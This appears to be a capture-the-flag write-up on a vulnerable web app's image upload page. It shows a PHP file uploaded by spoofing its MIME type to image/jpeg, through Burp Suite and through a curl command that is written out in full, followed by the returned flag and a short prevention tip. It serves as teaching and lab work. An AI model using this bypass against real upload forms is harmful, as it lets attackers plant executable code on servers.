
# File upload
The upload page [http://192.168.8.120/index.php?page=upload](http://192.168.8.120/index.php?page=upload "upload page") is not secure.

## Manipulation

In the path we find an image upload form, it has a file limit which can be changed on the front-end, but the have checked for it on the back end which is good.

The backend has accepted a php and xml file, this was achived by using ***Burpsuite*** and ***Curl***.

Using ***Burpsuite*** we had to use the browser to input the php file, then we intercept the request, We could then see the ***mime type*** of our file we then change it from ***application/php*** to ***image/jpeg***, then forward the request, then we get the flag.

Using ***Curl*** we can use command 
```bash
curl -F 'Upload=Upload' -F 'type=image/jpeg' -F 'uploaded=@/home/lindani/Desktop/php_file.php;type=image/jpeg' http://192.168.8.121/?page=upload | grep "flag"
```

The results
```html 
<pre><center><h2 style="margin-top:50px;">The flag is : 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8</h2><br/><img src="images/win.png" alt="" width=200px height=200px></center> </pre><pre>/tmp/php_file.php succesfully uploaded.</pre>
```

## Prevention
The back-end must check whether the file upload matches the specified ***mime-type*** 